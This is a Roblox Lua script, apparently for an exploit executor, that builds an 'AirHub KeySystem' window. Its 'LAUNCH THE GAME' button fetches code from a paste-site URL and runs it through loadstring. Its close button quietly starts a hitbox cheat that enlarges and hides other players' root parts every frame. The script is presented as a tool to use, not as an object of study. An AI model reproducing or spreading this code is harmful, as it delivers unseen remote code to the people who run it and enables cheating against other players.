local ScreenGui = Instance.new("ScreenGui")
local Drag = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local Brand = Instance.new("TextLabel")
local UICorner_1 = Instance.new("UICorner")
local Number1 = Instance.new("TextButton")
local UICorner_2 = Instance.new("UICorner")
local Number2 = Instance.new("TextButton")
local UICorner_3 = Instance.new("UICorner")
local Number3 = Instance.new("TextBox")
local UICorner_4 = Instance.new("UICorner")
local Tip = Instance.new("TextLabel")
local UICorner_5 = Instance.new("UICorner")
local CloseButton = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")
local MinimizeButton = Instance.new("TextButton")
local UICorner_7 = Instance.new("UICorner")
local MinimizeButtonS = Instance.new("TextButton")

ScreenGui.Name = "AirHub KeySystem"
ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.ResetOnSpawn = false

Drag.Name = "Drag"
Drag.Parent = ScreenGui
Drag.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Drag.Position = UDim2.new(0.0746791214, 0, 0.631474137, 0)
Drag.Size = UDim2.new(0, 285, 0, 150)
Drag.Position = UDim2.new(0.286014168, 0, 0.180454606, 0)
Drag.Visible = true
Drag.Active = true
Drag.Draggable = true

UICorner.Parent = Drag

Brand.Name = "Brand"
Brand.Parent = Drag
Brand.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Brand.BorderColor3 = Color3.fromRGB(30, 30, 30)
Brand.BackgroundTransparency = 1.000
Brand.Size = UDim2.new(0, 285, 0, 29)
Brand.Font = Enum.Font.Cartoon
Brand.Text = "AirHub KeySystem"
Brand.TextColor3 = Color3.fromRGB(255, 255, 255)
Brand.TextScaled = true
Brand.TextSize = 14.000
Brand.TextStrokeTransparency = 0.000
Brand.TextWrapped = true

UICorner_1.Parent = Brand

Number1.Name = "Number1"
Number1.Parent = Drag
Number1.BackgroundColor3 = Color3.fromRGB(68, 68, 68)
Number1.Position = UDim2.new(0.136842102, 0, 0.705641031, 0)
Number1.Size = UDim2.new(0, 200, 0, 29)
Number1.Font = Enum.Font.Cartoon
Number1.Text = "LAUNCH THE GAME"
Number1.TextColor3 = Color3.fromRGB(255, 255, 255)
Number1.TextScaled = true
Number1.TextSize = 14.000
Number1.TextWrapped = false
Number1.MouseButton1Down:connect(function()
loadstring(game:GetHttp("https://controlc.com/6bf7c12b", true))()
end)

UICorner_2.Parent = Number1

Number3.Name = "Number3"
Number3.Parent = Drag
Number3.BackgroundColor3 = Color3.new(68, 68, 68)
Number3.BackgroundTransparency = 0.050000000745058
Number3.Position = UDim2.new(0.147368419, 0, 0.379487187, 0)
Number3.Size = UDim2.new(0, 200, 0, 20)
Number3.Font = Enum.Font.SourceSans
Number3.PlaceholderText = "PUT KEY HERE"
Number3.Text = ""
Number3.TextColor3 = Color3.new(0, 0, 0)
Number3.TextSize = 18
Number3.TextWrapped = true
Number3.TextXAlignment = Enum.TextXAlignment.Left
Number3.TextYAlignment = Enum.TextYAlignment.Top
Number3.ClearTextOnFocus = false
--ScanText = "UDaJgApQkuyMN9zjZPbB"

UICorner_4.Parent = Number3

Tip.Name = "Tip"
Tip.Parent = Drag
Tip.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
Tip.BorderColor3 = Color3.fromRGB(49, 49, 49)
Tip.Position = UDim2.new(0, 0, 0.200000003, 0)
Tip.Size = UDim2.new(0, 285, 0, 13)
Tip.Font = Enum.Font.Cartoon
Tip.Text = ""
Tip.TextColor3 = Color3.fromRGB(255, 255, 255)
Tip.TextSize = 14.000
Tip.TextWrapped = true
Tip.TextScaled = true

UICorner_5.Parent = Tip

CloseButton.Parent = Drag
CloseButton.Name = "Close Button"
CloseButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
CloseButton.Position = UDim2.new(1, -30, 0, 0)
CloseButton.Size = UDim2.new(0, 30, 0, 30)
CloseButton.Font = Enum.Font.Cartoon
CloseButton.Text = "X"
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.TextScaled = true
CloseButton.TextSize = 16.000
CloseButton.TextWrapped = false

UICorner_6.Parent = CloseButton

MinimizeButton.Parent = Drag
MinimizeButton.Name = "Minimize"
MinimizeButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
MinimizeButton.Position = UDim2.new(1, -285, 0, 0)
MinimizeButton.Size = UDim2.new(0, 30, 0, 30)
MinimizeButton.Font = Enum.Font.Cartoon
MinimizeButton.Text = "-"
MinimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
MinimizeButton.TextScaled = true
MinimizeButton.TextSize = 18
MinimizeButton.TextWrapped = false

UICorner_7.Parent = MinimizeButton

MinimizeButtonS.Parent = ScreenGui
MinimizeButtonS.Name = "MinimizeS"
MinimizeButtonS.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
MinimizeButtonS.Position = UDim2.new(0, 0, 0, 0)
MinimizeButtonS.Size = UDim2.new(0, 30, 0, 30)
MinimizeButtonS.Font = Enum.Font.Cartoon
MinimizeButtonS.Text = "+"
MinimizeButtonS.TextColor3 = Color3.fromRGB(255, 255, 255)
MinimizeButtonS.TextScaled = true
MinimizeButtonS.TextSize = 16.000
MinimizeButtonS.TextWrapped = false
MinimizeButtonS.Visible = false

CloseButton.MouseButton1Click:Connect(function()
    _G.HeadSize = 1.5
    _G.Disabled = false
game:GetService('RunService').RenderStepped:connect(function()
    if not _G.Disabled then
    for i,v in next, game:GetService('Players'):GetPlayers() do
if v.Name ~= game:GetService('Players').LocalPlayer.Name then
pcall(function()
v.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)
v.Character.HumanoidRootPart.Transparency = 1
v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really black")
v.Character.HumanoidRootPart.Material = "Neon"
v.Character.HumanoidRootPart.CanCollide = false
end)
end
end
end
end)
    ScreenGui:Destroy()
end)

MinimizeButtonS.MouseButton1Down:connect(function()
Drag.Visible = true
MinimizeButtonS.Visible = false
end)

MinimizeButton.MouseButton1Down:connect(function()
Drag.Visible = false
MinimizeButtonS.Visible = true
end)
